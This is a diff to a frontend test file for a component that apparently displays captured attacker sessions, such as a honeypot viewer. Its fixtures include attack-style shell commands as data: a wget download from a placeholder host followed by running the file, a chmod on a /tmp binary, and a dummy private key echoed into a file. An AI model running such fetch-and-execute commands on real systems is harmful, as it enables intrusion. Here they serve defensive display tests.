@@ -370,9 +370,19 @@ describe("FeaturedAttack", () => {
         { timestamp: "2026-08-16T10:00:21Z", command: "chmod +x /tmp/x", username: null, password: null, tags: [] },
       ],
     }} />);
-    expect(screen.getByText(/\+1,8\d\d characters/)).toBeInTheDocument();
+    expect(screen.getByText(/\+1,9\d\d characters/)).toBeInTheDocument();
     expect(screen.getByTitle(blob)).toBeInTheDocument();
     expect(screen.getByText("chmod +x /tmp/x")).toBeInTheDocument();
+  });
+
+  it("collapses a pasted key file to its header", () => {
+    withReducedMotion();
+    const key = `-----BEGIN OPENSSH PRIVATE KEY-----\n${"b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA\n".repeat(20)}-----END OPENSSH PRIVATE KEY-----`;
+    render(<FeaturedAttack {...props} data={{
+      session: attack.session,
+      events: [{ timestamp: "2026-08-16T10:00:20Z", command: `echo '${key}' > key.ppk`, username: null, password: null, tags: [] }],
+    }} />);
+    expect(screen.getByText("echo '-----BEGIN OPENSSH PRIVATE KEY-----…' > key.ppk")).toBeInTheDocument();
   });
 
   it("replays a one-line script step by step, keeping quoted text whole", () => {
@@ -389,8 +399,8 @@ describe("FeaturedAttack", () => {
     expect(screen.getByText("echo 'a;b' > k")).toBeInTheDocument();
     expect(screen.getByText("wget http://x.example/a")).toBeInTheDocument();
     expect(screen.getByText("./a")).toBeInTheDocument();
-    // Still one command, however many steps it shows.
-    expect(screen.getByText(/1 command in/)).toBeInTheDocument();
+    // Each step is a command of its own.
+    expect(screen.getByText(/6 commands in/)).toBeInTheDocument();
   });
 
   it("collapses events ingested more than once", () => {
